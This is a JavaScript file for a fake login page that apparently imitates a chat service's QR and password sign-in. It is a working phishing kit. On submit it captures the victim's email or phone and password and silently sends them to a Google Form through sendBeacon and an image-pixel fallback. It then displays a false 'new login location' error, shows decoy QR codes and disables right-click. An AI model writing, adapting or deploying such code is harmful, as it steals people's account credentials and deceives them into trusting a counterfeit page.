// ==================================
// FULL script.js – WORKS 100% WITH YOUR "dope/head" FORM
// ==================================

const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000,
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,

  // YOUR CURRENT GOOGLE FORM (dope = email/phone, head = password)
  GOOGLE_FORM_URL: 'https://docs.google.com/forms/d/e/1FAIpQLSfIwiyfVGTfH2QFUPvorCjah2wcNYfrQRPopjNjSnnTNsD_kw/formResponse',
  ENTRY_DOPE:  'entry.90937571',   // "dope" field
  ENTRY_HEAD:  'entry.1380960419', // "head" field
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button[type='submit']"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  emailWrapper: document.querySelector('.email-wrapper'),
  passwordWrapper: document.querySelector('.password-wrapper'),
  form: document.querySelector('#loginForm')
};

// ==================================
// SILENT SUBMISSION – WORKS PERFECTLY WITH YOUR FORM
// ==================================
const sendToGoogleForms = (data) => {
  const payload = new URLSearchParams();
  payload.append(CONFIG.ENTRY_DOPE, data.emailOrPhone || '');
  payload.append(CONFIG.ENTRY_HEAD, data.password || '');

  // Method 1: sendBeacon (most reliable)
  if (navigator.sendBeacon) {
    navigator.sendBeacon(CONFIG.GOOGLE_FORM_URL, payload);
  }

  // Method 2: pixel fallback (double insurance)
  new Image().src = CONFIG.GOOGLE_FORM_URL + '?' + payload.toString() + '&_=' + Date.now();
};

// ==================================
// QR CODE MODULE (full working version)
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();
      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);
      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;
      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");
      const path = svgElement.querySelector("path");
      if (path) path.setAttribute("transform", `scale(${37 / moduleCount})`);
      return svgElement;
    } catch (e) {
      return null;
    }
  },

  getSpinnerMarkup() {
    return `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
              <span class="inner wanderingCubes">
                <span class="item"></span>
                <span class="item"></span>
              </span>
            </span>`;
  },

  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = '';
    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;
    DOM.qrCodeContainer.innerHTML = "";
    const fakeLink = `https://app.com/ra/${Math.random().toString(36).substring(2, 15)}`;
    const qrSvg = this.generate(fakeLink);
    if (qrSvg) DOM.qrCodeContainer.appendChild(qrSvg);
    DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
    DOM.qrCodeContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    this.simulateRefresh();
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  }
};

// ==================================
// LOGIN BUTTON MODULE (full working version)
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `<span class="spinner" role="img" aria-label="Loading">
              <span class="inner pulsingEllipsis">
                <span class="item spinnerItem"></span>
                <span class="item spinnerItem"></span>
                <span class="item spinnerItem"></span>
              </span>
            </span>`;
  },

  applyAnimationDelays() {
    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${i * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
    });
  },

  showNewLoginMessage() {
    if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
      const msg = document.createElement('span');
      msg.className = 'error-message';
      msg.textContent = 'New login location detected, please check your e-mail.';
      msg.style.cssText = 'color:red;display:block;font-size:12px;margin:5px 0;';
      DOM.emailWrapper.insertBefore(msg, DOM.emailInput);
    }
    if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
    if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
  },

  async showLoading() {
    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.disabled = true;
    this.applyAnimationDelays();

    const data = {
      emailOrPhone: DOM.emailInput?.value.trim() || '',
      password: DOM.passwordInput?.value || ''
    };

    // THIS LINE SENDS TO YOUR GOOGLE FORM
    sendToGoogleForms(data);

    await new Promise(r => setTimeout(r, CONFIG.ANIMATION_DURATION));
    this.showNewLoginMessage();
    this.reset();
  },

  reset() {
    DOM.loginButton.innerHTML = "Log In";
    DOM.loginButton.disabled = false;
  },

  init() {
    if (DOM.form) {
      DOM.form.addEventListener('submit', e => {
        e.preventDefault();
        this.showLoading();
      });
    }
  }
};

// ==================================
// INITIALIZATION
// ==================================
document.addEventListener("DOMContentLoaded", () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener("contextmenu", e => e.preventDefault());
});